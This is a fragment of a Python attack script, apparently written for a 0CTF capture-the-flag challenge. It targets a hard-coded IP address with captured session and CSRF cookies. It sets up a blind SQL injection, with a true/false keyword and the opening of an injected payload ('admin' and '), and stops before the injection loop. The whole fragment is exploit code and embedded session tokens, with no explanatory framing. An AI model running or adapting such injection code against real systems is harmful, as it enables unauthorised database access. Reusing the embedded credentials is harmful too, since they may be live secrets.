import requests

url = 'http://202.120.7.102:8081/index.php'

r = requests.session()
headers = {"Cookie": "ctf_session=DsPREzvYM1Sn%2BEEu4xtWzjcnwIj6BsPc66vKD6lntI%2BKOqTEy5h2LJqzY5gfZ2eWu7Ir3H%2BESoGUMqpjrshfi3WyQOgCKia5%2BusZ7%2FuaLXvzS1nFoE81VCRN8zF5ysLSs%2FcvKZ4DZqKMaSwSj6%2BsuyFzOwSkhHIl8hBdtzyJhVH%2BgPfih%2FuvGNONugRc5DAz%2BAFnY%2FseGbs%2Fr0KX4kwODalzkq8CAVZD5Fi1sUd4QVms2ZTGc26FChA%2FqySEz9aaWbK111RQnODlyWVwZGGRPw0it2BR0WgKDIOGRTV4tkX0CS10VM5W4teXkVGXnGsczJcNXpE%2BOn8fq0oe5YSNcYBsGKXpinPvi5IX1cxYlTxZHHJ%2FTR1GzaLgEj%2FUz5Cfhtl0n%2B8%2BhCc0Z134DrF9VmaRNyrFfYOP49EcVzEnl9E5f7cHaLYBnWhH%2FToR%2FdYsjUq8dtYefWZmokVFT%2BErPgptxwYsujl9e2yWzxbQv%2BeZqNJyJy89eU6zqHVXaegTSv8sUEpE8%2BLRDvw95zVjuYsGbog1JRVaSbcMsz68XnCPidqoI4hZFQquPGxWA6ltz0OkPvU%2BbvTzlJnAkO8IDrcr3QWh%2FdFNU7HVpbZUDy4EWOvXcvvhCLFl6of%2FeA9B8ko1CnNroI%2BQQ%2BcBLy10QQLTJtbkxLPjV389R0voGQK%2FzsicaVAg2gJUJQTu9TVNEc6eJFCRQThCAm084erN7g%3D%3D1fcd2321e06949e097bbde0d81d18f7a86c2b14d; 0ctf_csrf_cookie=570e33001307b850423f0a8e35ea3499"}
keyword = 'You ONLY have 1 RMB'
payload_basic = 'admin\' and '
